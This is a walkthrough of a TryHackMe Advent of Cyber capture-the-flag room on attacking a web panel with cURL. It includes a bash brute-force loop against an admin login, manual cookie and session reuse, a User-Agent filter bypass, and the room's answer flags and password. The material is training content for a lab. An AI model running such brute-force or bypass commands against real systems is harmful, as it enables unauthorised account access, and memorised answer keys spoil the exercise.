# 🎄 Advent of Cyber 2025 — Day 24  
<img src="./images/day24-banner.png" width="900"/>

**Title:** Exploitation with cURL - Hoperation Eggsploit 
**Category:** Web, HTTP, Command Line  
**Difficulty:** Easy–Medium   
**Room Link:** [Exploitation with cURL - Hoperation Eggsploit ](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0)  
**Status:** ✅ Completed  

---

## 🧭 Scenario Overview

Blue-team intelligence confirms that the **wormhole keeping King Malhare’s reinforcements alive** is controlled via a **web panel** hosted on the Evil Bunnies’ server.

The problem?

There’s:
- ❌ No browser  
- ❌ No Burp Suite  
- ❌ No GUI tools  

Only a **terminal**.

That’s enough.

We will speak **HTTP directly** using **cURL**, crafting requests by hand to:
- Interact with endpoints
- Handle sessions
- Brute-force logins
- Bypass filters
- Shut the wormhole down

---

## 🎯 Learning Objectives

- Understand HTTP requests & responses
- Use **cURL** for GET and POST requests
- View raw HTTP responses
- Handle cookies and sessions manually
- Automate brute-force attacks with bash
- Bypass User-Agent restrictions

---

## 🌐 HTTP Requests Using cURL

HTTP is how clients communicate with servers.

Browsers do this automatically.  
With **cURL**, we do it **manually**.

### Basic GET Request

``bash
curl http://10.49.133.14/
This sends an HTTP GET request and prints the raw HTML response to the terminal.

---
## 📤 Sending POST Requests

Simulating a login form submission:
curl -X POST -d "username=user&password=user" http://10.49.133.14/post.php

Expected response:
Invalid credentials

Including extra fields:
curl -X POST -d "username=user&password=user&submit=Login" http://10.49.133.14/post.php

To view headers + body:
curl -i -X POST -d "username=user&password=user" http://10.49.133.14/post.php

---
## 🍪 Using Cookies and Sessions

Web apps track sessions using cookies.

Step 1: Save cookies
curl -c cookies.txt -d "username=admin&password=admin" http://10.49.133.14/session.php

Step 2: Reuse cookies
curl -b cookies.txt http://10.49.133.14/session.php

This mimics a logged-in browser session.

---
## 🤖 Automating Brute Force with cURL

Create password list

admin123
password
letmein
secretpass
secret

Save as passwords.txt.

Brute-force script (loop.sh)
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.49.133.14/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done

Run it:
chmod +x loop.sh
./loop.sh

This is the core idea behind tools like Hydra and Burp Intruder.

---
## 🕵️ Bypassing User-Agent Restrictions

Some servers block curl by checking the User-Agent.

Default:
curl http://10.49.133.14/ua_check.php

Bypass using custom UA:
curl -A "TBFC" http://10.49.133.14/agent.php


Verify difference:

curl -i http://10.49.133.14/ua_check.php
curl -i -A "TBFC" http://10.49.133.14/ua_check.php

---
## ✅ Questions & Answers

Make a POST request to /post.php
Flag:

THM{curl_post_success}

Save and reuse session cookie from /cookie.php
Flag:

THM{session_cookie_master}

Brute-force /bruteforce.php
Admin password:

secretpass

Bypass User-Agent filter on /agent.php
Flag:

THM{user_agent_filter_bypassed}

---
## ⚔️ The Final Battle

With the wormhole closed:

Reinforcements cut off
King Malhare exposed
Sir Breachblocker III redeems himself

Wareville fights back.
Snowballs fly.
Eggs shatter.

McSkidy captures King Malhare.

---
## 🏁 The End of the Road

McSkidy freed
King Malhare imprisoned
Wareville saved
SOC-mas victorious 🎄


From TryHackMe:

Have a Merry SOC-mas and a “Hoppy” New Year! 🐰❄️
